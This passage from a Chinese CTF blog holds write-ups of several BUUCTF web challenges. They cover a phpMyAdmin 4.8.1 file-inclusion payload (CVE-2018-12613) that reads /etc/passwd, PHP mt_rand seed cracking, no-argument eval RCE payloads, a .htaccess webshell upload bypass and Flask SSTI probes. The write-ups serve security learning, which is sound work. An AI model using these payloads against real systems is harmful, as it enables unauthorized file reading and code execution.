<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
<p>因此，决定扫描目录，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
<h1 id="解题">解题</h1>
<p>通过该页面发现：</p>
<ol type="1">
<li><p>phpmyadmin 版本为 4.8.1</p></li>
<li><p>服务器用的是 apache</p></li>
<li><p>数据库是 mysql</p></li>
<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
<li><p>系统为 Ubuntu</p></li>
</ol>
<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
<p>得到 flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpmyadmin 漏洞</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 枯燥的抽奖</title>
    <url>/2022/04/26/GWCTF%202019%20%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BGWCTF%202019%5D枯燥的抽奖">GWCTF 2019 枯燥的抽奖</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426143656.png" /></p>
<p>需要我们写入完整的字符串，并且已经给了我们前十位。查看源码得到一个文件：check.php，直接访问，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="php伪随机数">2. PHP伪随机数</h1>
<p>详细的可以看一下下面的资料：</p>
<ul>
<li>[[PHP知识点#21 mt_srand和mt_rand伪随机数破解]]</li>
<li>参考：<a href="https://www.freebuf.com/vuls/192012.html">PHP mt_rand安全杂谈及应用场景详解 - FreeBuf网络安全行业门户</a></li>
</ul>
<p>这里简单的说下什么叫做伪随机数。<strong>随机数</strong>，顾名思义就是在给定范围内随机选择的数，没有任何规律可言。<strong>伪随机数</strong>，<strong>满足一定的规律</strong>，但是这些数字能够通过随机数检验。</p>
<p>php通过mt_srand()和mt_rand()两个函数实现伪随机数的生成。首先利用mt_srand(seed)传入一个种子（简单来说，就是确定某种规律），然后利用mt_rand(范围)生成特定范围内的伪随机数。</p>
<p>举个不靠谱的例子：假设某个函数y=ax+b，而我们传入的seed就是x，a和b都是给定常数。那么只要确定了x，就能够得到y；反之，如果我们有y，就能够得到x。</p>
<p>因此，利用php伪随机数生成的密码或者token是不安全的。可以利用下面的工具破解：</p>
<ul>
<li>工具：<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></li>
</ul>
<h1 id="解题">3. 解题</h1>
<p>首先分析一下代码，可以简单的分为三个部分。</p>
<h2 id="第一部分">3.1. 第一部分</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先开启一个session，然后如果我们的请求报中没有seed，则就随机一个值当作seed。</p>
<h2 id="第二部分">3.2. 第二部分</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这是最重要的部分。首先通过mt_srand()函数设置一个种子，即上一部分的seed，然后从大小写字母和数字中随机挑选20个（可重复）构成str。选取str的前10位显示出来。</p>
<h2 id="第三部分">3.3. 第三部分</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要通过POST方式提交参数num的值，然后与上一部分得到的20位的str做对比，如果一致，则get flag。</p>
<h2 id="payload构造">3.4. payload构造</h2>
<p>其实看到这题目，我最先想到的是爆破后10位。这种方法的注意点是，需要保持session，否则每请求一次，str就发生了变化。后来粗略计算了一下，需要 <span class="math inline">\(62^{10}\)</span> 的请求次数，理论上可行，但我感觉不是这么做。后来经过搜索发现了PHP伪随机数漏洞。</p>
<p>首先，编写如下代码，将给出的10个字符转变成php_mt_seed能够识别的数据： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">substr = <span class="string">&quot;R3s7A1z54e&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">length = <span class="built_in">len</span>(str1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(substr)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length):</span><br><span class="line">        <span class="keyword">if</span> str1[j] == substr[i]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(length-<span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">53</span> <span class="number">53</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span> <span class="number">18</span> <span class="number">18</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">27</span> <span class="number">27</span> <span class="number">0</span> <span class="number">61</span> <span class="number">25</span> <span class="number">25</span> <span class="number">0</span> <span class="number">61</span> <span class="number">31</span> <span class="number">31</span> <span class="number">0</span> <span class="number">61</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">61</span> <span class="number">4</span> <span class="number">4</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure></p>
<p>然后执行： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./php_mt_seed 53 53 0 61 29 29 0 61 18 18 0 61 33 33 0 61 36 36 0 61 27 27 0 61 25 25 0 61 31 31 0 61 30 30 0 61 4 4 0 61</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426151032.png" /></p>
<p>得到seed。</p>
<p>最后，编写如下php代码，生成20个字符，因为seed相同，因此生成的这20个字符与题目的一致。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">566162825</span>); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里有一个值得注意的点！！！那就是php版本要选对！！！要和工具给出的seed旁边的版本相匹配才能够生成一样的字符串！！！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426151517.png" /></p>
<p>将得到的payload用POST方式提交即可。</p>
<blockquote>
<p>这过程中，要保持浏览器不要关闭，否则session就断了，那么seed可能就不一样了。</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后发现什么信息都没有，数据包和源码都没有有用的信息。因此尝试扫描目录。但是我没有扫描出什么结果，可能是脚本不够强大吧。折腾无果后去搜索一下别人的WP，发现存在 <code>git</code> 泄露，因此使用 <code>githack</code> 下载。下载得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="解题">2. 解题</h1>
<p>第一个 <code>if</code> 过滤了一些伪协议；</p>
<p>第二个 <code>if</code> 比较难，第一次遇见，这是过滤了函数的参数。<code>?(R)?</code> 是递归匹配模式的意思。匹配到的字符串都会被空代替，最后还需要满足强对比。所以，我们传入的exp在最后得有 <code>;</code> ，并且前面的部分都要被匹配，从而只剩下 <code>;</code>。</p>
<p>详细解释一下第二个匹配模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)可以分为以下4个部分：</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
<p>假设输入的为 <code>print_r(scandir());</code>。这句话就是扫描某目录（此时目录并未指定），然后把目录下的所有文件名or子目录名形成一个数组返回并打印出来。</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">过程</th>
<th style="text-align: center;">被匹配的部分</th>
<th style="text-align: center;">备注</th>
<th style="text-align: center;">递归层数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">print_r</td>
<td style="text-align: center;"><code>[a-z,_]</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">print_r(</td>
<td style="text-align: center;"><code>\(</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">print_r(scandir</td>
<td style="text-align: center;"><code>(?R)?</code> 起作用，进入递归，再次匹配<code>[a-z,_]</code></td>
<td style="text-align: center;">1</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">print_r(scandir(</td>
<td style="text-align: center;"><code>\(</code> 再次起作用</td>
<td style="text-align: center;">1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">print_r(scandir()</td>
<td style="text-align: center;">进入第一个递归之后的 <code>\)</code> 起作用<br>执行之后退出第一次递归</td>
<td style="text-align: center;">执行时属于：1<br>执行结束后退出第一层递归：0</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;">print_r(scandir())</td>
<td style="text-align: center;"><code>\)</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
</tbody>
</table>
<p>最后剩下一个 <code>;</code> 成功匹配。如果带有参数，比如：<code>print_r(scandir('/'));</code>，到第4步为止都是一样的，第5步的时候因为此时应该匹配的是 <code>\)</code> ，但是，此时字符串的位置是 <code>'/')</code> 无法成功匹配，返回原来的字符串，从而无法绕过第二个 <code>if</code>。</p>
<p>成功绕过演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
<p>失败演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
<p>第三个 <code>if</code> 也比较简单，只是过滤了一些敏感词。</p>
<p>接下来就要做两件事：</p>
<ol type="1">
<li><p>找 flag 所在的路径，一般在当前目录或者根目录</p></li>
<li><p>找到了该怎么把路径表示出来，此时不能传入参数</p></li>
</ol>
<p>接下来需要对 PHP 比较了解的人能够想得到（反正我个菜鸟没有想到），先介绍几个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="number">2</span>. scandir(): 列出给定目录中的文件和目录。</span><br><span class="line"><span class="number">3</span>. readfile(): 输出一个文件。本题中，如果使用该函数输出flag，需要在源码中查看</span><br><span class="line"><span class="number">4</span>. current(): 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="number">5</span>. pos(): current() 的别名。</span><br><span class="line"><span class="number">6</span>. next(): 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="number">7</span>. array_reverse(): 以相反的元素顺序返回数组。</span><br><span class="line"><span class="number">8</span>. highlight_file(): 打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line"><span class="number">9</span>. array_flip(): 将数组的键和值互换</span><br><span class="line"><span class="number">10</span>. array_rand(): 随机读取数组中的一个或多个单元</span><br></pre></td></tr></table></figure>
<p>以上最难理解的就是 <code>localeconv()</code>，但是这又是最关键的，因为不能传入参数，所以得想方设法找到路径 <code>/</code> 和 <code>.</code> ，而该函数就能够找到后者。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
<p>注意上图中的箭头处，那是 <code>.</code> 。因此，我们只要将它取出来即可，这时候就需要用到<code>current()</code> 了。然后再配合上 <code>scandir()</code> 和 <code>print_r</code> 就可以得到当前目录下的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p>返回结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
<p>注意到 <code>flag.php</code> 在第4个，或者说是倒数第2个。此时有两种方法：</p>
<p>第一种，将整个数组反转，然后用 next() 取反转后的第二个元素，即 flag.php。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
<p>第二种比较看运气，利用 <code>array_flip()</code> 将交换数组的键和值</p>
<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
<p>然后利用 <code>array_rand(array_flip())</code> 将数组的键<strong>随机</strong>的读取</p>
<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
<p>最终的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>由于随机性，所以需要多刷新几次。</p>
<h1 id="总结">3. 总结</h1>
<p>由于对 PHP 代码的不熟悉，导致本题最多只能做到代码审计这一步。得挑个时候学学 PHP 了，跑不掉的呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>git泄露</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 BabyUpload</title>
    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
<h1 id="过滤测试">过滤测试</h1>
<h2 id="过滤类型测试">过滤类型测试</h2>
<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
<h2 id="过滤后缀测试">过滤后缀测试</h2>
<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
<h2 id="文件内容过滤">文件内容过滤</h2>
<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<ol type="1">
<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
<li>文件内容的过滤，需要知道多种木马的写法。</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <url>/2022/04/18/GYCTF2020%20FlaskApp/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp">FlaskApp</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png" /></p>
<p>经过测试，确实该题目可以进行base64加密和解密。该页面的框架是Flask，因此可能存在着SSTI。直接用<code>&#123;&#123;7*'7'&#125;&#125;</code>用base64加密后再解密，发现提示</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223727.png" /></p>
<p>换一个，用<code>&#123;&#123;0-0&#125;&#125;</code>，这时候得到的结果就是0，因此确实存在SSTI，并且渲染引擎是Flask。</p>
<h1 id="解题">2. 解题</h1>
<p>参考：<a href="Jinjia2+Flask模板注入.md">Jinjia2+Flask模板注入</a></p>
<p>输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224035.png" /></p>
<p>结果经过了html编码，可以看出第二个才是<code>object</code>。</p>
<p>下一步，查看有哪些可用的子类 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现并没有任何结果，但是如果输入如下， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[1]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224237.png" /></p>
